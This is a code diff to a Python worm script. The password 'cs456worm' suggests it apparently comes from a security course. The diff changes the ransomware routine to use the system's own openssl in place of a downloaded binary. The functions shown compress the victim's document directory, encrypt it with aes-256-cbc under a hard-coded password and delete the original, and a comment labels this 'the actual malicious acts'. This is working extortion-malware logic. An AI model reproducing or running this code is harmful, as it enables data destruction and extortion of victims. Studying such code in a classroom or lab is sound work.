@@ -43,7 +43,9 @@ if not WORM_NAME[0] == ".":
 WORM_DEST = "/tmp/" + WORM_NAME
 
 # Declare a variable to hold the full path to openssl
-OPENSSL = "/tmp/openssl"
+#OPENSSL = "/tmp/openssl"
+# Point OPENSSL to the local version
+OPENSSL = "/usr/bin/openssl"
 
 #===============================================================================
 # Define a set of support functions use by the worm
@@ -367,8 +369,9 @@ def compressEncryptDelete(directory):
 
         try:
             # Then we encrypt it.  We need to change open ssl to execute
-            call(["chmod", "a+x", OPENSSL])
-            print "Finished chmod openssl file"
+            #call(["chmod", "a+x", OPENSSL])
+            #print "Finished chmod openssl file"
+            
             # Run the encryption
             password = "cs456worm"
             ARGS = [OPENSSL, "aes-256-cbc", "-a", "-salt", "-in", tarName, "-out"]
@@ -433,8 +436,11 @@ def performExtorting():
     encryptedFile = None
 
     # Do the actual malicious acts
-    if downloadProgramFromNet() and os.path.exists(OPENSSL):
-        print "Successfully download openssl file"
+    # Since the openssl from download does not work out well.  We will be using
+    # the local version of openssl to run the encryption instead
+    #if downloadProgramFromNet() and os.path.exists(OPENSSL):
+    #    print "Successfully download openssl file"
+    if os.path.exists(OPENSSL):
 
         # Encrypt the directory
         encryptedFile = compressEncryptDelete(docDir)
